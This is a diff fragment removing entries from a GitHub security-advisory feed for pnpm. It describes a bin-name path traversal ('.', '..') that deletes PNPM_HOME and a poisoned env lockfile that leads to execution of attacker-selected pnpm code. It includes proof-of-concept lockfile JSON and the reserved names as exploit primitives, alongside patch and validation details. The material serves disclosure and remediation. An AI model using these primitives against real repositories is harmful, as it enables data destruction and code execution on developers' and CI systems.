-<p>The patched resolver no longer emits reserved bin names, and the global-remove regression proves the deletion sink receives only <code>path.join(globalBinDir, "good")</code>.</p>
-<h3 id="impact">Impact</h3>
-<p>Direct confidentiality impact was not validated for this primitive; the sink is deletion/corruption, not a read or disclosure path.</p>
-<h2 id="affected-products">Affected Products</h2>
-<p>Ecosystem: npm</p>
-<p>Package name: <code>pnpm</code></p>
-<p>Affected versions: versions before the patch that accept reserved manifest bin names in TypeScript global package flows.</p>
-<p>Patched versions: pending release containing the shared bin-name hardening.</p>
-<h2 id="severity">Severity</h2>
-<p>Corrected vulnerable severity: High</p>
-<p>Corrected vulnerable vector string: <code>CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:H</code></p>
-<p>Corrected vulnerable score: 8.1</p>
-<p>Final post-patch score: 0.0, not vulnerable after patch.</p>
-<p>The original scan score was 8.3 with <code>C:H/I:H/A:L</code>. Revalidation removes direct confidentiality impact and raises availability to high because the sink can recursively delete the global bin directory or its parent.</p>
-<h2 id="weaknesses">Weaknesses</h2>
-<p>CWE-22: Improper Limitation of a Pathname to a Restricted Directory</p>
-<p>CWE-73: External Control of File Name or Path</p>
-<h2 id="patch">Patch</h2>
-<ul>
-<li><code>bins/resolver/src/index.ts</code> now rejects empty, dot, and dot-dot bin names after scope stripping.</li>
-<li><code>bins/resolver/test/index.ts</code> covers empty, dot, dot-dot, and scoped reserved bin keys.</li>
-<li><code>global/commands/test/globalRemove.test.ts</code> proves global remove filters reserved manifest bin names before deletion and only removes a safe <code>good</code> shim.</li>
-<li><code>pacquet/crates/cmd-shim/src/bin_resolver.rs</code> mirrors the same reserved-name rejection; empty names were already rejected.</li>
-<li><code>pacquet/crates/cmd-shim/src/bin_resolver/tests.rs</code> extends parity coverage.</li>
-<li><code>.changeset/strange-bin-segments.md</code> records patch releases for <code>@pnpm/bins.resolver</code>, <code>pnpm</code>, and <code>pacquet</code>.</li>
-</ul>
-<p>Pacquet parity is appropriate at the shared bin resolver/linker boundary because pacquet dependency-management commands can resolve and link package bins, even though the TypeScript-only global remove/update/add replacement flow is the concrete destructive-delete sink.</p>
-<h2 id="validation">Validation</h2>
-<p>Passed locally:</p>
-<p>The script passed TypeScript builds, ESLint, <code>bins/resolver</code> Jest, global-remove sink Jest, pacquet fmt/tests, and <code>git diff --check</code>.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/pnpm/pnpm/security/advisories/GHSA-4gxm-v5v7-fqc4">https://github.com/pnpm/pnpm/security/advisories/GHSA-4gxm-v5v7-fqc4</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-55699">https://nvd.nist.gov/vuln/detail/CVE-2026-55699</a></li>
-<li><a href="https://github.com/advisories/GHSA-4gxm-v5v7-fqc4">https://github.com/advisories/GHSA-4gxm-v5v7-fqc4</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-4gxm-v5v7-fqc4</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-06-26T23:46:53.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[pnpm] pnpm: Reserved bin name deletes PNPM_HOME during global remove]]></title>
-        <id>https://github.com/advisories/GHSA-4gxm-v5v7-fqc4</id>
-        <link href="https://github.com/advisories/GHSA-4gxm-v5v7-fqc4"/>
-        <updated>2026-06-26T23:46:53.000Z</updated>
-        <content type="html"><![CDATA[<details>
-<summary>Maintainer Action Plan</summary>
-
-<h2 id="maintainer-action-plan">Maintainer Action Plan</h2>
-<p>This report is ready to review with the shared patch branch. Start with the PR and the expected fixed behavior, then use the detailed exploit narrative below only if you want to replay the original path.</p>
-<ul>
-<li>Advisory: <code>CAND-PNPM-085</code> / <code>GHSA-4gxm-v5v7-fqc4</code></li>
-<li>Advisory URL: <a href="https://github.com/pnpm/pnpm/security/advisories/GHSA-4gxm-v5v7-fqc4">https://github.com/pnpm/pnpm/security/advisories/GHSA-4gxm-v5v7-fqc4</a></li>
-<li>Shared patch PR: <a href="https://github.com/pnpm/pnpm-ghsa-j2hc-m6cf-6jm8/pull/1">https://github.com/pnpm/pnpm-ghsa-j2hc-m6cf-6jm8/pull/1</a></li>
-<li>Shared patch branch: <code>security/ghsa-batch-2026-06-09</code></li>
-<li>Patch commit: <code>a93449314f398cf4bdf2e28d033c02d37395ad22</code></li>
-<li>Base commit: <code>origin/main</code> <code>55a4035abf1ae3fe7208ba1f5ef43c5eff58ccec</code></li>
-<li>Maintainer priority: <code>appendix</code></li>
-<li>Component: <code>pnpm global add/remove bin cleanup</code></li>
-<li>Patch area: bin name/path segment validation</li>
-<li>Affected packages: <code>npm:pnpm</code></li>
-<li>CWE IDs: <code>CWE-22</code>, <code>CWE-73</code></li>
-<li>Conservative CVSS: <code>6.5</code> / <code>CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H</code></li>
-<li>Next action: review the shared patch branch for this component, set the final affected version range, merge and release the fix, then publish or close the advisory.</li>
-</ul>
-<h3 id="expected-patched-behavior">Expected Patched Behavior</h3>
-<p>Reserved, dot, and path-segment bin names are rejected or ignored; global remove leaves <code>PNPM_HOME</code> and the sentinel file intact.</p>
-<h3 id="files-and-tests-to-review">Files And Tests To Review</h3>
-<ul>
-<li><code>bins/resolver/src/index.ts</code></li>
-<li><code>bins/resolver/test/index.ts</code></li>
-<li><code>global/commands/test/globalRemove.test.ts</code></li>
-<li><code>pacquet/crates/cmd-shim/src/bin_resolver.rs</code></li>
-<li><code>pacquet/crates/cmd-shim/src/bin_resolver/tests.rs</code></li>
-<li><code>.changeset/strange-bin-segments.md</code></li>
-</ul>
-<h3 id="focused-validation">Focused Validation</h3>
-<p>Run these from a checkout of the shared patch branch. They are the useful maintainer commands with machine-local artifact paths removed.</p>
-<ul>
-<li>Use the private PR checks plus the patched replay coverage matrix for this candidate.</li>
-</ul>
-<p>The full patched replay for the shared branch passed with all 20 candidates marked fixed. This candidate's replay evidence is <code>results/CAND-PNPM-085-patched-result.json</code>.</p>
-
-
-<h2>Title</h2>
-<p>Reserved manifest bin names can make global package operations delete outside the global bin directory</p>
-</details>
-
-<h2 id="description">Description</h2>
-<h3 id="summary">Summary</h3>
-<p>Manifest <code>bin</code> object keys such as <code>""</code>, <code>"."</code>, and <code>".."</code> passed pnpm's bin-name guard. When a malicious package was installed globally, later global remove, update, or add-replacement flows could re-derive those names from the installed manifest and pass <code>path.join(globalBinDir, binName)</code> to <code>removeBin</code>. For <code>"."</code> this targets the global bin directory; for <code>".."</code> this targets its parent.</p>
-<h3 id="details">Details</h3>
-<p>The vulnerable dataflow was:</p>
-<ul>
-<li><code>bins/resolver/src/index.ts</code> converted manifest <code>bin</code> object keys to <code>binName</code> and only required URL-safe text or <code>$</code>. Empty, dot, dot-dot, and scoped forms such as <code>@scope/..</code> were not rejected after scope stripping.</li>
-<li><code>global/packages/src/scanGlobalPackages.ts</code> scanned installed global package manifests and returned manifest-derived <code>bin.name</code> values.</li>
-<li><code>global/commands/src/globalRemove.ts</code>, <code>global/commands/src/globalUpdate.ts</code>, and global add replacement logic joined those names to <code>globalBinDir</code>.</li>
-<li><code>bins/remover/src/removeBins.ts</code> recursively removed the resulting path.</li>
-</ul>
-<p>Install-time checks did not close the gap: bin target paths were package-root checked, conflict checks looked at the same escaped path but did not reject reserved segments, and bin-link warning paths could leave the package installed for later global operations.</p>
-<h3 id="poc">PoC</h3>
-<p>Run:</p>
-<p>The script first performs a safe prepatch simulation in a temporary directory:</p>
-<pre><code class="language-text">prepatch_reserved_bin_name=..
-prepatch_delete_target=/.../cand-pnpm-085.XXXXXX/home
-prepatch_deleted_global_bin_parent=true
-</code></pre>
-<p>It then validates the patched implementation:</p>
-<pre><code class="language-bash">./node_modules/.bin/tsgo --build bins/resolver/tsconfig.json
-./node_modules/.bin/tsgo --build global/commands/tsconfig.json
-./node_modules/.bin/eslint bins/resolver/src/index.ts bins/resolver/test/index.ts global/commands/test/globalRemove.test.ts
-cd bins/resolver
-NODE_OPTIONS="--experimental-vm-modules --disable-warning=ExperimentalWarning --disable-warning=DEP0169" ../../node_modules/.bin/jest test/index.ts --runInBand
-cd global/commands
-NODE_OPTIONS="--experimental-vm-modules --disable-warning=ExperimentalWarning --disable-warning=DEP0169" ../../node_modules/.bin/jest test/globalRemove.test.ts -t "global remove ignores reserved manifest bin names" --runInBand
-cargo fmt --manifest-path pacquet/crates/cmd-shim/Cargo.toml --check
-cargo test --manifest-path pacquet/crates/cmd-shim/Cargo.toml bin_resolver --lib
-git diff --check -- bins/resolver global/commands/test/globalRemove.test.ts pacquet/crates/cmd-shim .changeset/strange-bin-segments.md pnpm-lock.yaml
-</code></pre>
-<p>The patched resolver no longer emits reserved bin names, and the global-remove regression proves the deletion sink receives only <code>path.join(globalBinDir, "good")</code>.</p>
-<h3 id="impact">Impact</h3>
-<p>Direct confidentiality impact was not validated for this primitive; the sink is deletion/corruption, not a read or disclosure path.</p>
-<h2 id="affected-products">Affected Products</h2>
-<p>Ecosystem: npm</p>
-<p>Package name: <code>pnpm</code></p>
-<p>Affected versions: versions before the patch that accept reserved manifest bin names in TypeScript global package flows.</p>
-<p>Patched versions: pending release containing the shared bin-name hardening.</p>
-<h2 id="severity">Severity</h2>
-<p>Corrected vulnerable severity: High</p>
-<p>Corrected vulnerable vector string: <code>CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:H</code></p>
-<p>Corrected vulnerable score: 8.1</p>
-<p>Final post-patch score: 0.0, not vulnerable after patch.</p>
-<p>The original scan score was 8.3 with <code>C:H/I:H/A:L</code>. Revalidation removes direct confidentiality impact and raises availability to high because the sink can recursively delete the global bin directory or its parent.</p>
-<h2 id="weaknesses">Weaknesses</h2>
-<p>CWE-22: Improper Limitation of a Pathname to a Restricted Directory</p>
-<p>CWE-73: External Control of File Name or Path</p>
-<h2 id="patch">Patch</h2>
-<ul>
-<li><code>bins/resolver/src/index.ts</code> now rejects empty, dot, and dot-dot bin names after scope stripping.</li>
-<li><code>bins/resolver/test/index.ts</code> covers empty, dot, dot-dot, and scoped reserved bin keys.</li>
-<li><code>global/commands/test/globalRemove.test.ts</code> proves global remove filters reserved manifest bin names before deletion and only removes a safe <code>good</code> shim.</li>
-<li><code>pacquet/crates/cmd-shim/src/bin_resolver.rs</code> mirrors the same reserved-name rejection; empty names were already rejected.</li>
-<li><code>pacquet/crates/cmd-shim/src/bin_resolver/tests.rs</code> extends parity coverage.</li>
-<li><code>.changeset/strange-bin-segments.md</code> records patch releases for <code>@pnpm/bins.resolver</code>, <code>pnpm</code>, and <code>pacquet</code>.</li>
-</ul>
-<p>Pacquet parity is appropriate at the shared bin resolver/linker boundary because pacquet dependency-management commands can resolve and link package bins, even though the TypeScript-only global remove/update/add replacement flow is the concrete destructive-delete sink.</p>
-<h2 id="validation">Validation</h2>
-<p>Passed locally:</p>
-<p>The script passed TypeScript builds, ESLint, <code>bins/resolver</code> Jest, global-remove sink Jest, pacquet fmt/tests, and <code>git diff --check</code>.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/pnpm/pnpm/security/advisories/GHSA-4gxm-v5v7-fqc4">https://github.com/pnpm/pnpm/security/advisories/GHSA-4gxm-v5v7-fqc4</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-55699">https://nvd.nist.gov/vuln/detail/CVE-2026-55699</a></li>
-<li><a href="https://github.com/advisories/GHSA-4gxm-v5v7-fqc4">https://github.com/advisories/GHSA-4gxm-v5v7-fqc4</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-4gxm-v5v7-fqc4</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-06-26T23:46:53.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[pnpm] pnpm: Project env lockfile can short-circuit package-manager resolution and execute lockfile-selected pnpm bytes]]></title>
-        <id>https://github.com/advisories/GHSA-w466-c33r-3gjp</id>
-        <link href="https://github.com/advisories/GHSA-w466-c33r-3gjp"/>
-        <updated>2026-06-26T23:34:07.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="maintainer-action-plan">Maintainer Action Plan</h2>
-<p>This report is ready to review with the shared patch branch. Start with the PR and the expected fixed behavior, then use the detailed exploit narrative below only if you want to replay the original path.</p>
-<ul>
-<li>Advisory: <code>CAND-PNPM-063</code> / <code>GHSA-w466-c33r-3gjp</code></li>
-<li>Advisory URL: <a href="https://github.com/pnpm/pnpm/security/advisories/GHSA-w466-c33r-3gjp">https://github.com/pnpm/pnpm/security/advisories/GHSA-w466-c33r-3gjp</a></li>
-<li>Shared patch PR: <a href="https://github.com/pnpm/pnpm-ghsa-j2hc-m6cf-6jm8/pull/1">https://github.com/pnpm/pnpm-ghsa-j2hc-m6cf-6jm8/pull/1</a></li>
-<li>Shared patch branch: <code>security/ghsa-batch-2026-06-09</code></li>
-<li>Patch commit: <code>a93449314f398cf4bdf2e28d033c02d37395ad22</code></li>
-<li>Base commit: <code>origin/main</code> <code>55a4035abf1ae3fe7208ba1f5ef43c5eff58ccec</code></li>
-<li>Maintainer priority: <code>start-here</code></li>
-<li>Component: <code>pnpm packageManager env lockfile</code></li>
-<li>Patch area: package-manager env lockfile is re-resolved through trusted registries before execution</li>
-<li>Affected packages: <code>npm:pnpm</code>, <code>npm:@pnpm/installing.env-installer</code></li>
-<li>CWE IDs: <code>CWE-829</code>, <code>CWE-494</code>, <code>CWE-345</code></li>
-<li>Conservative CVSS: <code>8.8</code> / <code>CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H</code></li>
-<li>Next action: review the shared patch branch for this component, set the final affected version range, merge and release the fix, then publish or close the advisory.</li>
-</ul>
-<h3 id="expected-patched-behavior">Expected Patched Behavior</h3>
-<p>Committed env-lockfile package-manager entries are force-refreshed through trusted registries before execution; attacker tarball requests and markers stay at zero.</p>
-<h3 id="files-and-tests-to-review">Files And Tests To Review</h3>
-<ul>
-<li><code>installing/env-installer/src/resolvePackageManagerIntegrities.ts</code></li>
-<li><code>pnpm/src/switchCliVersion.ts</code></li>
-<li><code>pnpm/src/switchCliVersion.test.ts</code></li>
-<li><code>.changeset/clean-package-manager-registries.md</code></li>
-</ul>
-<h3 id="focused-validation">Focused Validation</h3>
-<p>Run these from a checkout of the shared patch branch. They are the useful maintainer commands with machine-local artifact paths removed.</p>
-<pre><code class="language-bash">./node_modules/.bin/tsgo --build installing/env-installer/tsconfig.json
-./node_modules/.bin/tsgo --build pnpm/tsconfig.json
-PNPM_REGISTRY_MOCK_PORT=7799 NODE_OPTIONS="--experimental-vm-modules --disable-warning=ExperimentalWarning --disable-warning=DEP0169" ../node_modules/.bin/jest src/switchCliVersion.test.ts -t "re-resolved package-manager lockfile" --runInBand
-PNPM_REGISTRY_MOCK_PORT=7799 NODE_OPTIONS="--experimental-vm-modules --disable-warning=ExperimentalWarning --disable-warning=DEP0169" ../node_modules/.bin/jest src/switchCliVersion.test.ts src/syncEnvLockfile.test.ts --runInBand
-./node_modules/.bin/eslint installing/env-installer/src/resolvePackageManagerIntegrities.ts pnpm/src/switchCliVersion.ts pnpm/src/switchCliVersion.test.ts
-git diff --check
-</code></pre>
-<p>The full patched replay for the shared branch passed with all 20 candidates marked fixed. This candidate's replay evidence is <code>results/CAND-PNPM-063-patched-result.json</code>.</p>
-
-
-<h3 id="summary">Summary</h3>
-<p>pnpm can persist package-manager bootstrap metadata in the first YAML document of <code>pnpm-lock.yaml</code>. Before the patch, direct pnpm execution trusted an already resolved <code>packageManagerDependencies</code> entry when the committed env lockfile contained matching <code>pnpm</code> and <code>@pnpm/exe</code> versions. A malicious repository could therefore commit package-manager lockfile package records and snapshots that bypassed fresh package-manager resolution, then cause pnpm to install and execute bytes selected by that committed lockfile state during automatic version switching.</p>
-<h3 id="details">Details</h3>
-<p>The vulnerable source-to-sink path was:</p>
-<ul>
-<li><code>lockfile/fs/src/envLockfile.ts</code> reads the repository's first YAML lockfile document and validates shape only.</li>
-<li><code>pnpm/src/main.ts</code> reaches <code>switchCliVersion()</code> when a direct pnpm invocation sees a wanted <code>pnpm</code> package manager with <code>onFail=download</code>.</li>
-<li><code>pnpm/src/switchCliVersion.ts</code> reads the committed env lockfile when package-manager metadata should be persisted.</li>
-<li><code>installing/env-installer/src/resolvePackageManagerIntegrities.ts</code> treated <code>packageManagerDependencies</code> as resolved when only the <code>pnpm</code> and <code>@pnpm/exe</code> versions matched.</li>
-<li><code>engine/pm/commands/src/self-updater/installPnpm.ts</code> converts env-lockfile <code>snapshots</code> and <code>packages</code> into the wanted lockfile used by <code>headlessInstall()</code>.</li>
-<li><code>pnpm/src/switchCliVersion.ts</code> executes the installed <code>pnpm</code> binary with <code>spawn.sync()</code>.</li>
-</ul>
-<p>The helper fast path is intentionally still version-based for non-execution callers, so the security boundary is enforced at the execution path: <code>switchCliVersion()</code> now re-resolves already present package-manager env-lockfile entries before they can reach <code>installPnpmToStore()</code> and <code>spawn.sync()</code>.</p>
-<h3 id="poc">PoC</h3>
-<p>Standalone PoC and verification script:</p>
-<p>The PoC constructs a committed env-lockfile object with matching package-manager dependency versions and attacker-selected package metadata:</p>
-<pre><code class="language-json">{
-  "importers": {
-    ".": {
-      "configDependencies": {},
-      "packageManagerDependencies": {
-        "@pnpm/exe": { "specifier": "9.3.0", "version": "9.3.0" },
-        "pnpm": { "specifier": "9.3.0", "version": "9.3.0" }
-      }
-    }
-  },
-  "lockfileVersion": "9.0",
-  "packages": {
-    "/pnpm@9.3.0": {
-      "resolution": {
-        "integrity": "sha512-poisoned"
-      }
-    }
-  },
-  "snapshots": {
-    "/pnpm@9.3.0": {}
-  }
-}
-</code></pre>
-<p>Pre-patch exploit model:</p>
-<ol>
-<li>The victim runs pnpm directly in a malicious repository.</li>
-<li>The requested package-manager version differs from the currently running pnpm.</li>
-<li>pnpm enters <code>switchCliVersion()</code> and reads the committed env lockfile.</li>
-<li>Matching <code>pnpm</code> / <code>@pnpm/exe</code> versions short-circuit package-manager resolution.</li>
-<li>pnpm installs from the committed env-lockfile package records and executes the resulting <code>pnpm</code> binary.</li>
-</ol>
-<p>Observed primitive proof from the PoC:</p>
-<pre><code class="language-json">{
-  "primitive": "unforced resolver reuses already-resolved env lockfile metadata",
-  "isResolvedByVersionOnly": true,
-  "reusedPoisonedIntegrity": true
-}
-</code></pre>
-<p>The same script then runs the patched <code>switchCliVersion</code> regression. The regression seeds a poisoned committed env lockfile, has the resolver return a trusted replacement lockfile, and asserts <code>installPnpmToStore()</code> receives the trusted lockfile rather than the committed one. This would fail on the vulnerable control flow because the resolver was not called and the committed lockfile reached the installer.</p>
-<p>Focused validation commands:</p>
-<pre><code class="language-bash">./node_modules/.bin/tsgo --build installing/env-installer/tsconfig.json
-./node_modules/.bin/tsgo --build pnpm/tsconfig.json
-PNPM_REGISTRY_MOCK_PORT=7799 NODE_OPTIONS="--experimental-vm-modules --disable-warning=ExperimentalWarning --disable-warning=DEP0169" ../node_modules/.bin/jest src/switchCliVersion.test.ts -t "re-resolved package-manager lockfile" --runInBand
-PNPM_REGISTRY_MOCK_PORT=7799 NODE_OPTIONS="--experimental-vm-modules --disable-warning=ExperimentalWarning --disable-warning=DEP0169" ../node_modules/.bin/jest src/switchCliVersion.test.ts src/syncEnvLockfile.test.ts --runInBand
-./node_modules/.bin/eslint installing/env-installer/src/resolvePackageManagerIntegrities.ts pnpm/src/switchCliVersion.ts pnpm/src/switchCliVersion.test.ts
-git diff --check
-</code></pre>
-<p>Validation result:</p>
-<ul>
-<li>The PoC confirmed the unforced resolver still reuses a version-matching env lockfile, proving the original primitive.</li>
-<li>Patched <code>switchCliVersion()</code> calls <code>resolvePackageManagerIntegrities()</code> with <code>force: true</code> when committed env-lockfile package-manager entries already satisfy the requested version.</li>
-<li>Patched <code>switchCliVersion()</code> assigns the resolver return value back to <code>envLockfile</code>.</li>
-<li>The installer receives the refreshed lockfile and not the poisoned committed lockfile.</li>
-<li>TypeScript builds passed for <code>@pnpm/installing.env-installer</code> and <code>pnpm</code>.</li>
-<li>The focused Jest regression passed: 1 passed, 1 skipped in <code>switchCliVersion.test.ts</code>.</li>
-<li>ESLint passed for the affected package-manager switch files.</li>
-<li><code>git diff --check</code> passed.</li>
-</ul>
-<h3 id="impact">Impact</h3>
-<p>A malicious repository can cause arbitrary package-manager code execution in the victim's developer or CI environment before normal command handling continues. That code executes with the victim user's privileges and can read local secrets, alter project files, mutate dependency state, or run further commands.</p>
-<h2 id="affected-products">Affected products</h2>
-<p>Ecosystem: npm</p>
-<p>Package name: <code>pnpm</code>, <code>@pnpm/installing.env-installer</code></p>
-<p>Affected versions: current main before this patch; direct pnpm execution with package-manager auto-switching and a repository-controlled env lockfile.</p>
-<p>Patched versions: pending release containing this patch.</p>
-<h2 id="severity">Severity</h2>
-<p>Severity: High</p>
-<p>Vector string: <code>CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H</code></p>
-<p>Base score: 8.8</p>
-<p>Rationale: the malicious source is repository-controlled package-manager lockfile state delivered through normal supply-chain channels. Exploitation is low complexity once the victim runs pnpm directly, no attacker privileges are required, and user interaction is required. Successful exploitation executes attacker-selected package-manager code in the victim user's security context, with high confidentiality, integrity, and availability impact.</p>
-<h2 id="weaknesses">Weaknesses</h2>
-<p>CWE-829: Inclusion of Functionality from Untrusted Control Sphere</p>
-<p>CWE-494: Download of Code Without Integrity Check</p>
-<p>CWE-345: Insufficient Verification of Data Authenticity</p>
-<h2 id="patch">Patch</h2>
-<p>The patch makes automatic package-manager switching re-resolve repository-provided bootstrap metadata before install and execution:</p>
-<ul>
-<li><code>resolvePackageManagerIntegrities()</code> accepts <code>force</code>, which bypasses the version-only fast path.</li>
-<li><code>switchCliVersion()</code> creates a store controller even when the committed env lockfile already contains satisfying package-manager dependency versions.</li>
-<li><code>switchCliVersion()</code> calls <code>resolvePackageManagerIntegrities()</code> with <code>force: true</code> for already resolved package-manager entries.</li>
-<li><code>switchCliVersion()</code> assigns the returned env lockfile back to <code>envLockfile</code>, so <code>installPnpmToStore()</code> installs from freshly resolved metadata.</li>
-<li>The package-manager bootstrap registry hardening from CAND-PNPM-061 is reused, so the refresh happens through trusted package-manager registries rather than repository workspace registries.</li>
-</ul>
-<p>Changed files:</p>
-<ul>
-<li><code>installing/env-installer/src/resolvePackageManagerIntegrities.ts</code></li>
-<li><code>pnpm/src/switchCliVersion.ts</code></li>
-<li><code>pnpm/src/switchCliVersion.test.ts</code></li>
-</ul>
-<p>Changeset:</p>
-<ul>
-<li><code>.changeset/clean-package-manager-registries.md</code></li>
-</ul>
-<p>Pacquet parity:</p>
-<p>No pacquet-side patch is required for this finding because pacquet does not implement pnpm's package-manager auto-switch path or <code>installPnpmToStore()</code>.</p>
-<h2 id="cvss-reassessment">CVSS Reassessment</h2>
-<p>Initial CVSS remains correct for vulnerable versions: <code>CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H</code> / 8.8 High.</p>
-<p>Final CVSS after patch: not vulnerable after patch / 0.0. The PoC still demonstrates the underlying unforced env-lockfile reuse primitive, but the patched execution path force-refreshes package-manager metadata through trusted bootstrap registries before install or execution.</p>
-<h2 id="remaining-risk">Remaining Risk</h2>
-<p>The helper <code>resolvePackageManagerIntegrities()</code> still has an unforced fast path that treats matching <code>pnpm</code> and <code>@pnpm/exe</code> versions as resolved. Current execution-sensitive callers either use trusted roots/registries or pass through the patched <code>switchCliVersion()</code> boundary, but future execution paths should use <code>force: true</code> before installing or executing package-manager bytes from repository-provided env-lockfile metadata.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/pnpm/pnpm/security/advisories/GHSA-w466-c33r-3gjp">https://github.com/pnpm/pnpm/security/advisories/GHSA-w466-c33r-3gjp</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-55698">https://nvd.nist.gov/vuln/detail/CVE-2026-55698</a></li>
-<li><a href="https://github.com/advisories/GHSA-w466-c33r-3gjp">https://github.com/advisories/GHSA-w466-c33r-3gjp</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-w466-c33r-3gjp</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-06-26T23:34:06.000Z</published>
     </entry>
 </feed>
